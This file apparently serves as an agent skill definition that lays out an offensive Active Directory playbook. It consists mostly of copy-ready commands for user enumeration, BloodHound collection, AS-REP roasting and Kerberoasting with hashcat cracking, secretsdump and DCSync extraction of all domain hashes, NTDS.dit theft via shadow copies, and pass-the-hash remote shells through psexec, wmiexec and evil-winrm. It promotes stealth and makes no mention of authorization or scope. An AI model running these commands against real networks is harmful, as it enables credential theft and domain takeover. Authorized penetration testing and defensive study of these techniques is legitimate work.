---
name: active-directory-and-lateral-movement
description: "Active Directory exploitation, credential dumping, Kerberos attacks, and lateral movement methodology."
version: 1.0.0
author: Kestrel Agent
license: AGPL-3.0
platforms: [linux, windows]
metadata:
  kestrel:
    tags: [ad, kerberos, active-directory, lateral-movement, mimikatz, impacket, bloodhound, pentest]
prerequisites:
  commands: [python3, bash]
---

# Active Directory Penetration Testing & Lateral Movement

Complete offensive methodology for Active Directory domain penetration testing, privilege escalation within forests, and stealthy lateral movement.

## 1. Domain Enumeration & Reconnaissance

### Lightweight LDAP & RPC Enumeration (No Domain Join Required)
```bash
# Enumerate domain users and password policy anonymously or with low-priv creds
netexec smb <DC_IP> -u '' -p '' --users --pass-pol
netexec ldap <DC_IP> -u 'domain_user' -p 'password' --users --groups

# RPC Null Session probe
rpcclient -U "" -N <DC_IP> -c "enumdomusers; enumdomgroups"

# Kerbrute user enumeration (does NOT generate logon failure events)
kerbrute userenum -d <DOMAIN.LOCAL> --dc <DC_IP> /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

### BloodHound Graph Ingestion
```bash
# Python BloodHound collector
bloodhound-python -u 'domain_user' -p 'password' -d <DOMAIN.LOCAL> -ns <DC_IP> -c All --zip

# Ingestion query focus in BloodHound:
# - Find Shortest Paths to Domain Admins
# - Shortest Paths from Kerberoastable Users
# - Find Principals with DCSync Rights
```

---

## 2. Kerberos Attacks

### AS-REP Roasting (Accounts with DONT_REQ_PREAUTH)
```bash
# Request AS-REP tickets for vulnerable accounts
impacket-GetNPUsers <DOMAIN.LOCAL>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip <DC_IP>

# Offline cracking with Hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Kerberoasting (Service Principal Names)
```bash
# Request TGS tickets for all SPN accounts
impacket-GetUserSPNs <DOMAIN.LOCAL>/'domain_user':'password' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt

# Offline cracking with Hashcat
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked_spn.txt
```

---

## 3. Credential Harvesting & Extraction

### LSASS & SAM Dumping
```bash
# Remote registry SAM/SYSTEM extraction
impacket-secretsdump <DOMAIN.LOCAL>/'Administrator':'password'@<TARGET_IP>

# DCSync replication attack (extract ALL domain hashes including krbtgt)
impacket-secretsdump -just-dc-ntlm <DOMAIN.LOCAL>/'compromised_admin'@<DC_IP>

# NTDS.dit extraction via Volume Shadow Copy (VSS)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive
```

---

## 4. Lateral Movement & Remote Execution

### Pass-the-Hash (PtH)
```bash
# Remote interactive shell via WMI
impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN.LOCAL>/Administrator@<TARGET_IP>

# Remote shell via SMB Service (psexec)
impacket-psexec -hashes :<NTLM_HASH> <DOMAIN.LOCAL>/Administrator@<TARGET_IP>

# WinRM remote access via evil-winrm
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
```

### Overpass-the-Hash (Pass-the-Key)
```bash
# Request Kerberos TGT from NTLM hash
impacket-getTGT <DOMAIN.LOCAL>/Administrator -hashes :<NTLM_HASH>
export KRB5CCNAME=Administrator.ccache

# Execute with Kerberos ticket authentication
impacket-psexec -k -no-pass <DOMAIN.LOCAL>/Administrator@<HOSTNAME>.<DOMAIN.LOCAL>
```
